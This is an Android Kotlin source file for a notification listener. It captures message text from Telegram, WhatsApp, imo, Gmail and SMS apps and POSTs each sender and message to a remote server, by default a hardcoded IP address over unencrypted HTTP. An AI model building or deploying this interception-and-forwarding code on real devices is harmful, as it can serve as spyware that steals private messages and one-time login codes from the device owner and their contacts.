package com.kimo.mayapp

import android.os.Handler
import android.os.Looper
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.widget.Toast
import okhttp3.MediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import org.json.JSONObject
import java.io.IOException

class MyNotificationListener : NotificationListenerService() {

    companion object {
        // متغیرهای ضد تکرار (Anti-Spam)
        private var lastMessageText = ""
        private var lastSendTime = 0L
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        
        val packageName = sbn?.packageName ?: return
        val extras = sbn.notification.extras
        
        val title = extras.getCharSequence("android.title")?.toString() ?: "ناشناس"
        var text = extras.getCharSequence("android.text")?.toString() ?: ""
        if (text.isEmpty()) {
            text = extras.getCharSequence("android.bigText")?.toString() ?: ""
        }

        // فیلتر برنامه‌های مجاز
        val appName = when {
            packageName.contains("telegram", ignoreCase = true) -> "تلگرام"
            packageName.contains("whatsapp", ignoreCase = true) -> "واتساپ"
            packageName.contains("imo", ignoreCase = true) -> "ایمو"
            packageName.contains("google.android.gm", ignoreCase = true) -> "جیمیل"
            packageName.contains("mms", ignoreCase = true) || 
            packageName.contains("messaging", ignoreCase = true) || 
            packageName.contains("telephony", ignoreCase = true) -> "پیامک"
            else -> return 
        }

        // --- فیلتر دقیق برای حذف کانال‌ها و گروه‌ها در تلگرام ---
        if (appName == "تلگرام") {
            if (text.contains("از گفتگو") || text.contains("پیام جدید")) {
                return
            }

            if (text.contains("Proxy") || text.contains("proxy") || text.contains("прокси") || 
                text.contains("@") && (text.contains("http") || text.contains("t.me"))) {
                return
            }

            if (title.contains("پروکسی") || title.contains("Proxy") || title.contains("اخبار") || 
                title.contains("channel") || title.contains("کانال") || title.contains("bot")) {
                return
            }
        }
        // -----------------------------------------------------------------

        if (text.isNotEmpty()) {
            val currentTime = System.currentTimeMillis()
            
            // جلوگیری از ارسال تکراری یک پیام در بازه زمانی کمتر از ۵ ثانیه
            if (text == lastMessageText && (currentTime - lastSendTime) < 5000) {
                return
            }
            
            lastMessageText = text
            lastSendTime = currentTime

            Handler(Looper.getMainLooper()).post {
                Toast.makeText(applicationContext, "[$appName] $title: $text", Toast.LENGTH_SHORT).show()
            }

            // ارسال به سرور
            sendToServer(appName, title, text)
        }
    }

    private fun sendToServer(app: String, sender: String, message: String) {
        val sharedPreferences = getSharedPreferences("AppSettings", MODE_PRIVATE)
        val defaultUrl = "http://195.38.19.47:5005/receive_sms"
        val url = sharedPreferences.getString("server_url", defaultUrl) ?: defaultUrl

        val client = OkHttpClient()
        
        val jsonBody = JSONObject().apply {
            put("sender", "[$app] $sender")
            put("body", message)
        }
        
        val mediaType = MediaType.parse("application/json; charset=utf-8")
        val requestBody = RequestBody.create(mediaType, jsonBody.toString())

        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: okhttp3.Call, e: IOException) {
                AppLogger.log("NetError", "خطا در ارسال: ${e.message}")
            }
            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                response.close()
            }
        })
    }
}
